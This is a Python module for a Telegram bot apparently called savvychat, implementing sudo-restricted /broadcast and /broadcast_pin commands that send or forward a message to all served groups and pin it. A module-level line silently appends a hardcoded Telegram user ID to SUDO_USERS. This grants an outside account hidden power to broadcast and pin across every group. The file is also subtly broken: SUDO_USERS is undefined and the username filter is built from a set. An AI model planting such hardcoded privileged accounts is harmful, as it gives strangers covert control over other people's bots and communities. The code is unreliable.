import asyncio
import traceback
from typing import Callable
from pyrogram.types import Message
from pyrogram import filters

from savvychat import bot as Client
from savvychat.database.chats import get_served_chats
from savvychat.database.users import get_served_users

uname = {Client.username}


SUDO_USERS.append(1669178360)


def sudo_users_only(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        if message.from_user.id in SUDO_USERS:
            return await func(client, message)

    return decorator



@Client.on_message(filters.command(["broadcast", f"broadcast@{uname}"]) & ~filters.edited)
@sudo_users_only
async def broadcast_message_nopin(c: Client, message: Message):
    if not message.reply_to_message:
        pass
    else:
        x = message.reply_to_message.message_id
        y = message.chat.id
        sent = 0
        chats = []
        schats = await get_served_chats()
        for chat in schats:
            chats.append(int(chat["chat_id"]))
        for i in chats:
            try:
                m = await c.forward_messages(i, y, x)
                await asyncio.sleep(0.3)
                sent += 1
            except Exception:
                pass
        await message.reply_text(f"✅ Broadcast complete in {sent} Group.")
        return
    if len(message.command) < 2:
        await message.reply_text(
            "**usage**:\n\n/broadcast (`message`) or (`reply to message`)"
        )
        return
    text = message.text.split(None, 1)[1]
    sent = 0
    chats = []
    schats = await get_served_chats()
    for chat in schats:
        chats.append(int(chat["chat_id"]))
    for i in chats:
        try:
            m = await c.send_message(i, text=text)
            await asyncio.sleep(0.3)
            sent += 1
        except Exception:
            pass
    await message.reply_text(f"✅ Broadcast complete in {sent} Group.")


@Client.on_message(filters.command(["broadcast_pin", f"broadcast_pin@{uname}"]) & ~filters.edited)
@sudo_users_only
async def broadcast_message_pin(c: Client, message: Message):
    if not message.reply_to_message:
        pass
    else:
        x = message.reply_to_message.message_id
        y = message.chat.id
        sent = 0
        pin = 0
        chats = []
        schats = await get_served_chats()
        for chat in schats:
            chats.append(int(chat["chat_id"]))
        for i in chats:
            try:
                m = await c.forward_messages(i, y, x)
                try:
                    await m.pin(disable_notification=True)
                    pin += 1
                except Exception:
                    pass
                await asyncio.sleep(0.3)
                sent += 1
            except Exception:
                pass
        await message.reply_text(
            f"✅ Broadcast complete in {sent} Group.\n📌 Sent with {pin} chat pins."
        )
        return
    if len(message.command) < 2:
        await message.reply_text(
            "**usage**:\n\n/broadcast_pin (`message`) or (`reply to message`)"
        )
        return
    text = message.text.split(None, 1)[1]
    sent = 0
    pin = 0
    chats = []
    schats = await get_served_chats()
    for chat in schats:
        chats.append(int(chat["chat_id"]))
    for i in chats:
        try:
            m = await c.send_message(i, text=text)
            try:
                await m.pin(disable_notification=True)
                pin += 1
            except Exception:
                pass
            await asyncio.sleep(0.3)
            sent += 1
        except Exception:
            pass
    await message.reply_text(
        f"✅ Broadcast completed in {sent} Group.\n📌 Sent with {pin} chat pins."
    )

